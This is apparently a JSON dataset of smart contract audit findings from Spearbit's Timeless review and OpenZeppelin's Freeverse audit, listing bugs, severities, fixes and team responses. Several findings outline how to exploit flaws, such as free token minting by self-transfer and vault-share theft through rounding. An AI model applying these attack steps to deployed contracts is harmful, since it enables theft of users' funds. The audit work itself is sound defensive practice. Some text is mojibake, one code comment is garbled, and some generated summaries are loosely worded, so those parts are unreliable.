      "content": "## Severity: Low Risk\n\n**Context:** Swapper.sol#L133\n\n**Description:** The `doZeroExSwap()` function takes in two ERC20 addresses which are `tokenIn` and `tokenOut`. The problem is that the `doZeroExSwap()` function does not check if the two token addresses are different from one another. Adding this check can reduce possible attack vectors.\n\n**Recommendation:** Consider implementing the following check.\n\n```solidity\nrequire(tokenIn != tokenOut, \"Duplicate tokens\");\n```\n\n**Timeless:** Implemented in PR #1.\n\n**Spearbit:** Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6768",
      "title": "UniswapV3Swapper uses wrong allowance check",
      "impact": "LOW",
      "content": "## Low Risk Severity Issue\n\n## Context\n- UniswapV3Swapper.sol#L282\n- UniswapV3Swapper.sol#L373\n\n## Description\nBefore the `UniswapV3Swapper` can exit a gate, it needs to set an `XPYT` allowance to the gate. The following check determines if an approval needs to be set:\n\n```solidity\nif (\n    args.xPYT.allowance(address(this), address(args.gate)) <\n    tokenAmountOut\n) {\n    args.xPYT.safeApprove(address(args.gate), type(uint256).max);\n}\nargs.gate.exitToUnderlying(\n    args.recipient,\n    args.vault,\n    args.xPYT,\n    tokenAmountOut\n);\n```\n\nThe `tokenAmountOut` is in an underlying token amount but is compared against an `xPYT` shares amount. A legitimate `gate.exitToUnderlying` call will check:\n\n```solidity\nxPYT.withdraw(tokenAmountOut, address(gate), address(swapper));\n```\n\nThis checks if `allowance[swapper][gate] >= previewWithdraw(tokenAmountOut)`.\n\n## Recommendation\nIn practice, the actual value does not matter as there is either no approval set or an infinite approval. We still recommend replacing the incorrect code with a comparison against the `xPYT`-converted `tokenAmountOut` for correctness:\n\n```solidity\n- if (args.xPYT.allowance(address(this), address(args.gate)) < tokenAmountOut)\n+ if (args.xPYT.allowance(address(this), address(args.gate)) <\n    args.xPYT.previewWithdraw(tokenAmountOut));\n```\n\n## Timeless\nImplemented in PR #2.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6767",
      "title": "Low uniswapV3TwapSecondsAgo may result in AMM manipulation in pound()",
      "impact": "LOW",
      "content": "## Security Assessment\n\n## Severity\n- **Low Risk**\n\n## Context\n- **File:** UniswapV3xPYT.sol\n- **Line:** 98\n\n## Description\nThe lower the value of `uniswapV3TwapSecondsAgo` is set at construction time, the easier it becomes for an attacker to manipulate the results of the `pound()` function. \n\nIt becomes easier for attackers to manipulate automated market maker price feeds with a lower time horizon, requiring less capital to manipulate prices. However, users may simply choose not to use an xPYT contract that sets `uniswapV3TwapSecondsAgo` too low.\n\n## Recommendation\nAdd a lower bound for `uniswapV3TwapSecondsAgo` in the constructor.\n\n## Timeless\nWeâ€™re fine with this, since xPYT creation is permissionless; users will just choose xPYTs with security parameters theyâ€™re comfortable with.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6766",
      "title": "Factory.sol owner can change fees unexpectedly",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n**Severity:** Low Risk  \n**Context:** Factory.sol#L141  \n\n**Description:**  \nThe Factory.sol owner may be able to front run yield calculations in a gate implementation and change user fees unexpectedly.\n\n**Recommendation:**  \nPut a time lock in place for any fee changes made by the factory owner.\n\n**Timeless:**  \nAcknowledged, weâ€™re fine with this as the Factory is planned to be owned by a Governor contract that already has built-in timelock mechanics.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6765",
      "title": "Possible outstanding allowances from Gate",
      "impact": "LOW",
      "content": "## Security Report\n\n## Severity\n**Low Risk**\n\n## Context\nGate.sol#L216\n\n## Description\nThe `vault` parameter of `Gate.enterWithUnderlying` can be chosen by an attacker in such a way that `underlying = vault.asset()` is another vault token of the Gate itself. The subsequent `_depositIntoVault(underlying, underlyingAmount, vault)` call will approve `underlyingAmount` of `underlying` tokens to the provided vault and could, in theory, allow stealing from other vault shares.\n\nThis is currently only exploitable in very rare cases because the caller also has to transfer the `underlyingAmount` to the gate contract first. For example, when transferring `underlyingAmount = type(uint256).max` is possible due to flashloans/flashmints, and the vault shares implement approvals in a way that do not decrease anymore if the allowance is `type(uint256).max`, as is the case with ERC4626 vaults.\n\n## Recommendation\nAs a best practice, consider resetting the approvals to zero after the `vault.deposit` call (as it is assumed to consume the allowance) to make sure that after the transaction ran, there are never any outstanding approvals on arbitrary token contracts from the gate to arbitrary spenders. This mitigates other unknown attack vectors.\n\n## Timeless\nImplemented in PR #8.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6764",
      "title": "Rounding issues when exiting a vault through shares",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`Gate.sol#L383`\n\n## Description\nWhen exiting a vault through `Gate.exitToVaultShares`, the user specifies a `vaultSharesAmount`. The amount of PYT and NYT to burn is determined by a `burnAmount = _vaultSharesAmountToUnderlyingAmount(vaultSharesAmount)` call. All implementations of this function in derived `YearnGate` and `ERC4626` contracts round down the `burnAmount`. This means one needs to burn fewer amounts than the value of the received vault shares.\n\nThis attack can be profitable and lead to all vault shares being stolen if the gas costs of this attack are low. This can be the case with vault and underlying tokens that have a low number of decimals, highly valuable shares, or cheap gas costs.\n\n### Consider the following scenario:\n- Imagine the following vault assets: `totalAssets = 1.9M`, `supply = 1M`. Therefore, 1 share is theoretically worth 1.9 underlying.\n- Call `enterWithUnderlying(underlyingAmount = 1900)` to mint 1900 PYT/NYT (and the gate receives `1900 * supply / totalAssets = 1000` vault shares).\n- Call `exitToVaultShares(vaultSharesAmount = 1)`, then `burnAmount = shares.mulDivDown(totalAssets(), supply) = 1 * totalAssets / supply = 1`. This burns 1 \"underlying\" (actually PYT/NYT but they are 1-to-1), but you receive 1 vault share (worth 1.9 underlying). Repeat this for up to the minted 1900 PYT/NYT.\n- Can redeem the 1900 vault shares for 3610 underlying directly at the vault, making a profit of `3610 - 1900 = 1710` underlying.\n\n## Recommendation\nThe `_vaultSharesAmountToUnderlyingAmount` function should be replaced by a `_vaultSharesAmountToUnderlyingAmountUp` function which rounds up to avoid users profiting from receiving more value in vault shares than they burn in underlying.\n\n## Timeless\nImplemented in PR #5.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nA bug report has been raised with Medium Risk severity for Gate.sol#L383. When users exit a vault through Gate.exitToVaultShares, they specify a vaultSharesAmount. The amount of underlying tokens to be burned is determined by a function call. In this function, the burnAmount is rounded down, allowing users to burn fewer amounts than the value of the received vault shares. This can lead to all vault shares being stolen if gas costs are low.\n\nFor example, if the total assets are 1.9M, and supply is 1M, then 1 share is worth 1.9 underlying. If a user calls enterWithUnderlying(underlyingAmount = 1900) to mint 1900 PYT/NYT, and then calls exitToVaultShares(vaultSharesAmount = 1), the burnAmount will be 1 * totalAssets / supply = 1. This burns 1 underlying, but the user receives 1 vault share (worth 1.9 underlying). This process can be repeated up to the minted 1900 PYT/NYT, allowing the user to redeem the 1900 vault shares for 3610 underlying directly at the vault, making a profit of 1710 underlying.\n\nTo avoid users profiting from receiving more value in vault shares than they burn in underlying, the _vaultSharesAmountToUnderlyingAmount function should be replaced by a _vaultSharesAmountToUnderlyingAmountUp function which rounds up. This has been implemented in PR #5, and acknowledged.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6763",
      "title": "TickMath might revert in solidity version 0.8",
      "impact": "MEDIUM",
      "content": "## Security Report\n\n## Severity\n**Medium Risk**\n\n## Context\n`TickMath.sol#L2`\n\n## Description\nUniswapV3â€™s `TickMath` library was changed to allow compilations for solidity version 0.8. However, adjustments to account for the implicit overflow behavior that the contract relies upon were not performed. The `UniswapV3xPYT.sol` is compiled with version 0.8 and indirectly uses this library through the `OracleLibrary`. In the worst case, it could be that the library always reverts (instead of overflowing as in previous versions), leading to a broken xPYT contract.\n\nThe same pragma `solidity >=0.5.0;` instead of `pragma solidity >=0.5.0 <0.8.0;` adjustments have been made for the `OracleLibrary` and `PoolAddress` contracts. However, their code does not rely on implicit overflow behavior.\n\n## Recommendation\nFollow the implementation of the official `TickMath` 0.8 branch which uses unchecked blocks for every function. Consider using the official Uniswap files with two different versions of this file, one for solidity versions <0.8 and one for 0.8 from the 0.8 branch.\n\n## Timeless\nImplemented in PR #3.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the UniswapV3xPYT.sol contract which is compiled with solidity version 0.8. The issue here is that the TickMath library that is used by this contract was changed to allow compilation for solidity version 0.8 but adjustments were not made to account for the implicit overflow behavior that the contract relies upon. This could potentially lead to a broken xPYT contract.\n\nThe recommendation to resolve this issue is to follow the implementation of the official TickMath 0.8 branch which uses unchecked blocks for every function and consider using the official Uniswap files with two different versions of this file, one for solidity versions <0.8 and one for 0.8 from the 0.8 branch. The bug has been implemented in PR #3 and acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6762",
      "title": "Swapper left-over token balances can be stolen",
      "impact": "MEDIUM",
      "content": "## Swapper Contract Security Concerns\n\n## Context\n- **Swapper**: `Swapper.sol#L133`\n- **Uniswap V3 Swapper**: `UniswapV3Swapper.sol#L187`\n\n## Description\nThe `Swapper` contract may never have any left-over token balances after performing a swap because token balances can be stolen by anyone in several ways:\n- By using `Swapper.doZeroExSwap` with `useSwapperBalance` and `tokenOut = tokenToSteal`\n- Arbitrary token approvals to arbitrary spenders can be set on behalf of the `Swapper` contract using `UniswapV3Swapper.swapUnderlyingToXpyt`.\n\n## Recommendation\nAll transactions must atomically move all tokens in and out of the contract when performing swaps to prevent any left-over token balances or susceptibility to front-running attacks.\n\n## Timeless\nAcknowledged, this is the intended way to use `Swapper`: it should not hold any tokens before and after a transaction.",
      "summary": "\nThis bug report is about the Swapper and UniswapV3Swapper contracts. It is possible for anyone to steal token balances from the Swapper contract by using the Swapper.doZeroExSwap with useSwapperBalance and tokenOut = tokenToSteal, or by setting arbitrary token approvals to arbitrary spenders on behalf of the Swapper contract using UniswapV3Swapper.swapUnderlyingToXpyt. \n\nThe recommendation is for all transactions to move all tokens in and out of the contract atomically when performing swaps, in order to not leave any left-over token balances or be susceptible to front-running attacks. This is acknowledged as the intended way to use Swapper and it should not hold any tokens before and after a transaction.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6761",
      "title": "Wrong yield accumulation in claimYieldAndEnter",
      "impact": "HIGH",
      "content": "## High Risk Report\n\n## Severity \n**High Risk**\n\n## Context\n`Gate.sol#L590`\n\n## Description\nThe `claimYieldAndEnter` function does not accrue yield to the Gate contract itself (this) in case `xPYT` was specified. The idea is to accrue yield for the mint recipient first before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case `xPYT` is used, tokens are minted to the Gate before its yield is accrued.\n\nCurrently, the transfer from this to `xPYT` through the `xPYT.deposit` call accrues yield for this after the tokens have been minted to it:\n\n```\nuserPYTBalance * (updatedYieldPerToken - actualUserYieldPerToken) / PRECISION\n```\n\nand its balance increased. This leads to it receiving a larger yield amount than it should have.\n\n## Recommendation\nAccrue yield to the address receiving the minted tokens.\n\n```solidity\n// accrue yield to recipient\n// no need to do it if the recipient is msg.sender, since\n// we already accrued yield in _claimYield\nif (pytRecipient != msg.sender) {\n    if (address(xPYT) != address(0) || pytRecipient != msg.sender) {\n        _accrueYield(\n            vault,\n            pyt,\n            address(xPYT) == address(0) ? pytRecipient : address(this),\n            updatedPricePerVaultShare\n        );\n    }\n}\n```\n\n### Minting Tokens\n```solidity\n// mint NYTs and PYTs\nyieldTokenTotalSupply[vault] += yieldAmount;\nnyt.gateMint(nytRecipient, yieldAmount);\nif (address(xPYT) == address(0)) {\n    // mint raw PYT to recipient\n    pyt.gateMint(pytRecipient, yieldAmount);\n} else {\n    // mint PYT and wrap in xPYT\n    pyt.gateMint(address(this), yieldAmount);\n    if (pyt.allowance(address(this), address(xPYT)) < yieldAmount) {\n        // set PYT approval\n        pyt.approve(address(xPYT), type(uint256).max);\n    }\n    xPYT.deposit(yieldAmount, pytRecipient);\n}\n```\n\n## Timeless\nYes, if we use `sweep` below we can accrue yield in the same way as in `_enter`. Fix implemented in PR #5.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is regarding the Gate.sol#L590 function called claimYieldAndEnter. This function does not accrue yield to the Gate contract itself in case xPYT is specified. This leads to the Gate contract receiving a larger yield amount than it should have. \n\nThe recommendation is to accrue yield to the address receiving the minted tokens. The code needs to be changed such that if xPYT is not address 0, then the yield should be accrued to the address receiving the minted tokens. The Timeless team implemented this fix in PR #5. Spearbit acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6760",
      "title": "xPYT auto-compound does not take pounder reward into account",
      "impact": "HIGH",
      "content": "## High Risk Report\n\n## Severity\n**High Risk**\n\n## Context\n`xPYT.sol#L179`\n\n## Description\nConceptually, the `xPYT.pound` function performs the following steps:\n\n1. Claims `yieldAmount` yield for itself, deposits the yield back to receive more PYT/NYT (Gate.claimYieldEnter).\n2. Buys `xPYT` with the NYT.\n3. Performs a `ERC4626.redeem(xPYT)` with the bought amount, burning `xPYT` and receiving `pytAmountRedeemed` PYT.\n4. Performs a `ERC4626.deposit(pytAmountRedeemed + yieldAmount = pytCompounded)`.\n5. Pays out a reward in PYT to the caller.\n\nThe `assetBalance` is correctly updated for the first four steps but does not decrease by the pounder reward, which is transferred out in the last step. \n\n### Impact\n- The contract has a smaller assets (PYT) balance than what is tracked in `assetBalance`.\n- Future depositors will have to make up for it as `sweep` computes the difference between these two values.\n- The `xPYT` exchange ratio is wrongly updated and withdrawers can redeem `xPYT` for more assets than they should until the last withdrawer is left holding valueless `xPYT`.\n\n### Example\nConsider the following example and assume 100% fees for simplicity, i.e., `pounderReward = pytCompounded`.\n\n- **Vault total**: 1k assets, 1k shares total supply.\n- **Pound with 100% fee**:\n  - Claims `YPYT/NYT`.\n  - Swaps `YNYT` to `XxPYT`.\n  - Redeems `XxPYT` for `XPYT` by burning `XxPYT` (supply -= X, exchange ratio is 1-to-1 in example).\n  - `assetBalance` is increased by claimed `YPYT`.\n  - Pounder receives a pounder reward of `X + Y PYT` but does not decrease `assetBalance` by pounder reward `X+Y`.\n\n- **Vault totals** should be `1k-X` assets, `1k-X` shares, keeping the same share price.\n- Nevertheless, vault totals actually are `1k+Y` assets, `1k-X` shares. Although pounder receives 100% of pounding rewards, the `xPYT` price `(assets / shares)` increased.\n\n## Recommendation\nThe `assetBalance` should also decrease by the `pounderReward`.\n\n```solidity\n- unchecked {\n- assetBalance += yieldAmount;\n- }\n+ // using unchecked should still be fine? as pounderReward <= yieldAmount + pytAmountRedeemed. and pytAmountRedeemed must have already been in the contract because of the implicit /grave.ts1redeem /grave.ts1, i.e., assetBalance >= pytAmountRedeemed, !, !\n+ assetBalance = assetBalance + yieldAmount - pounderReward;\n```\n\nConsider adding a test that verifies correct `assetBalance` updates.\n\n## Timeless\nImplemented in PR #2.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the xPYT.sol#L179 function in the xPYT contract. It outlines the steps taken by the function and the impact of the bug. The function claims yieldAmount yield for itself, deposits the yield back to receive more PYT/NYT (Gate.claimYieldEnter), buys xPYT with the NYT, performs a ERC4626.redeem(xPYT) with the bought amount, burning xPYT and receiving pytAmountRedeemed PYT, and performs a ERC4626.deposit(pytAmountRedeemed + yieldAmount = pytCompounded). The assetBalance is correctly updated for the first four steps but does not decrease by the pounder reward which is transferred out in the last step.\n\nThe impact of this bug is that the contract has a smaller assets (PYT) balance than what is tracked in assetBalance. This means that future depositors will have to make up for it as sweep computes the difference between these two values. Additionally, the xPYT exchange ratio is wrongly updated and withdrawers can redeem xPYT for more assets than they should until the last withdrawer is left holding valueless xPYT.\n\nThe recommendation is that the assetBalance should also decrease by the pounderReward. Consider adding a test that verifies correct assetBalance updates. The bug has been implemented in PR #2 and acknowledged.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "6759",
      "title": "Mint PerpetualYieldTokens for free by self-transfer",
      "impact": "HIGH",
      "content": "## Severity: Critical Risk\n\n## Context\n*PerpetualYieldToken.sol#L53*\n\n## Description\nThe `transfer` and `transferFrom` functions operate on cached balance values. When transferring tokens to oneself, the decreased balance is overwritten by an increased balance, which makes it possible to mint PYT tokens for free.\n\nConsider the following exploit scenario:\n- Attacker A self-transfers by calling `token.transfer(A, token.balanceOf(A))`.\n- `balanceOf[msg.sender]` is first set to zero but then overwritten by `balanceOf[to] = toBalance + amount`, doubling Aâ€™s balance.\n\n## Recommendation\nFix the issue in `transfer` and `transferFrom` by operating on the latest storage balances instead of cached values.\n\n## Discussion\n**Timeless:** Would checking for self-transfers and doing an early return be the best way to solve it?\n\n**Spearbit:** It would be best regarding gas efficiency; nevertheless, it should still trigger a `gate.beforePerpetualYieldTokenTransfer` call once to accrue the yield because the user would expect any transfer to accrue yields for `from` and `to`, and maybe someone is reliant on this. Additionally, it should also trigger the Transfer event for ERC20 compliance.\n\n**Timeless:** Not sure about triggering `gate.beforePerpetualYieldTokenTransfer` during self-transfers; seems like a niche use case.\n\n**Spearbit:** Then its behavior is inconsistent. Because self-transfers are a niche use case anyway, might as well do the additional call to make it consistent. It would not increase gas cost per execution for non-self-transfer calls as you need the `if` branch + return anyway.\n\n**Timeless:** Implemented in PR #4.\n\n**Spearbit:** The bug still exists in `transferFrom` diff PR #4. Youâ€™re checking `msg.sender != to`, but it should be `from != to` in this case - you always want to check the balance owners. The test should be with a spender different from `from`, and all three parties are testers.\n\n**Timeless:** Nice catch, fixed in this commit.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nThe bug report is about a critical risk associated with the PerpetualYieldToken.sol#L53. The bug is related to the PYT.transfer and transferFrom functions which operate on cached balance values. This issue makes it possible for attackers to mint PYT tokens for free by self-transferring tokens.\n\nThe recommendation to fix the issue is to operate on the latest storage balances instead of cached values. It was suggested to check for self-transfers and do an early return to solve it. It was also suggested that this should trigger a gate.beforePerpetualYieldTokenTransfer call once to accrue the yield and also trigger the Transfer event for ERC20 compliance.\n\nThe bug was further found to exist in the transferFrom diff PR #4. It was found that the test should be with a spender different from from and all three parties are tester. The bug was finally fixed in the commit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Timeless",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Timeless-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "JayJonah",
        "Christoph Michel"
      ]
    },
    {
      "id": "10578",
      "title": "Registration process is not clearly documented",
      "impact": "LOW",
      "content": "TheÂ `PaymentsERC20`Â contract allows a seller to register themselves by calling theÂ [`registerAsSeller`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L83)Â function. However, the system allows purchase of assets from unregistered sellers if theÂ [`_isSellerRegistrationRequired`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L47)Â flag is not set. In the scenario whereÂ `_isSellerRegistrationRequired`Â is set to false, any calls toÂ `registerAsSeller`Â would be meaningless and would result in seller paying for the gas used for making this unnecessary transaction.\n\n\nThe codebase fails to document the meaning of â€œregistrationâ€, the advantage of being a registered seller, and why is it okay to disable this process.\n\n\nConsider adding proper documentation as to why this process is required in the system and the scenarios in which it can be changed or disabled.\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `65269d9`Â of PR #8](https://github.com/freeverseio/PaymentsERC20Public/pull/8/commits/65269d92bf4dc5873494a8698489ab6c1f656365). However, there is a typographical error in the newly added docstring. In theÂ [`README`](https://github.com/freeverseio/PaymentsERC20Public/pull/8/files#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5R48)Â andÂ [docstring in theÂ `PaymentsERC20`Â contract](https://github.com/freeverseio/PaymentsERC20Public/pull/8/files#diff-a1161af37df27afe160babd013386cbb0e5513e2201e7a5be2f607cb8095dc4aR44), â€œexecutedâ€ is misspelled as â€œexectutedâ€.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10577",
      "title": "Naming issues hinder code understanding and readability",
      "impact": "LOW",
      "content": "To favor explicitness and readability, several parts of the contracts may benefit from better naming. Some suggestions are:\n\n\n* `States`Â enum in theÂ `IPaymentsERC20`Â interface should beÂ `State`Â enum\n* In theÂ `EIP712Verifier`, the variable nameÂ `inp`Â is confusing as it indicates bothÂ [`PaymentInput`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/EIP712Verifier.sol#L32)Â andÂ [`AssetTransferResult`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/EIP712Verifier.sol#L55)Â structs. Consider having different names for different parameters.\n* Throughout theÂ `PaymentsERC20`Â contract, the local variable name forÂ `Payment`Â struct isÂ [`p`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L226).\n\n\nConsider having a meaningful naming convention for variables instead of using single letters such asÂ `p`Â or abbreviated words such asÂ `inp`.\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `4c2dc66`Â of PR #7](https://github.com/freeverseio/PaymentsERC20Public/pull/7/commits/4c2dc664e963538804a11f64ed2340242e026c51).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10576",
      "title": "No check that seller is already registered",
      "impact": "LOW",
      "content": "TheÂ `registerAsSeller`Â function in theÂ `PaymentsERC20`Â contractÂ [emits aÂ `NewSeller`Â event](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L85)Â when a user calls it. There is no check inÂ `registerAsSeller`Â to determine if a user address is already registered, so this function will emit aÂ `NewSeller`Â event every time it is called. Depending on how the event log is used, this may lead to incorrect behavior by external observers of the contract if a user calls the function more than once.\n\n\nConsider checking the existing bool value ofÂ [`_isRegisteredSeller`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/PaymentsERC20.sol#L48)Â whenÂ `registerAsSeller`Â is called, and reverting if the user is already registered.\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `6c7a698`Â of PR #6](https://github.com/freeverseio/PaymentsERC20Public/pull/6/commits/6c7a6981271213c96106592df04c560e5120285e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10575",
      "title": "Missing docstrings",
      "impact": "LOW",
      "content": "The following functions in the codebase lack documentation:\n\n\n* All the functions, events, and state variables in theÂ [`FeesCollectors`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/FeesCollectors.sol)Â contract are missing docstrings\n* All the functions, events, and state variables in theÂ [`Operators`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/Operators.sol)Â contract are missing docstrings\n* TheÂ [`PaymentInput`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IEIP712Verifier.sol#L15)Â andÂ [`AssetTransferResult`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IEIP712Verifier.sol#L25)Â structs in theÂ `IEIP712Verifier`Â interface have no comments explaining any of the fields\n* [None of the events](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/Payments/IPaymentsERC20.sol#L44-L53)Â in theÂ `IPaymentsERC20`Â interface have any documentation\n* There are no docstrings in theÂ [`MyToken`](https://github.com/freeverseio/PaymentsERC20Public/blob/a95f0f6499be396c0a245f0183009b98cc72f123/contracts/ERC20/ERC20Token.sol)Â contract to explain the contractâ€™s purpose\n\n\nThis lack of documentation hinders reviewersâ€™ understanding of the codeâ€™s intention, which is fundamental to correctly assess not only security, but also correctness. Additionally, docstrings improve readability and ease maintenance. They should explicitly explain the purpose or intention of the functions, the scenarios under which they can fail, the roles allowed to call them, the values returned, and the events emitted.\n\n\nConsider thoroughly documenting all functions (and their parameters) that are part of the contractsâ€™ public API. Functions implementing sensitive functionality, even if not public, should be clearly documented as well. When writing docstrings, consider following theÂ [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html)Â (NatSpec).\n\n\n***Update:**Â Fixed as ofÂ [commitÂ `d311775`Â of PR #5](https://github.com/freeverseio/PaymentsERC20Public/pull/5/commits/d311775947bd0d0f124608d2b3661864cab2831e). However, there are a few typographical errors in the newly added docstrings:*Â â€“Â *In theÂ [docstring above theÂ `MyToken`Â contract](https://github.com/freeverseio/PaymentsERC20Public/pull/5/commits/d311775947bd0d0f124608d2b3661864cab2831e#diff-beef814db30f6b0739866b0fcf066cfd6bb25c0d13c505670ccf50c6bc35855aR7), â€œimplementationâ€ is misspelled as â€œimplentationâ€*Â â€“Â *In theÂ [docstring above theÂ `AssetTransferResult`Â struct](https://github.com/freeverseio/PaymentsERC20Public/pull/5/commits/d311775947bd0d0f124608d2b3661864cab2831e#diff-406c64718cc3e18344e4d19841ba68227a8e546c7441253c5c38da85a5a0abdfR53), â€œASSET\\_TRANSFERRINGâ€ is misspelled as â€œASSET\\_TRANSFERINGâ€;Â [PR #26](https://github.com/freeverseio/PaymentsERC20Public/pull/26/files#diff-b78f92f68b12efa431798fc6ddb920d8eef31586fa2cf2fb9df76ca467dee40bR51)Â moves this line toÂ `ISignableStructs.sol`*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Freeverse Audit",
      "source_link": "https://blog.openzeppelin.com/freeverse-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10574",
      "title": "Inconsistent and lack of indexed event parameters",
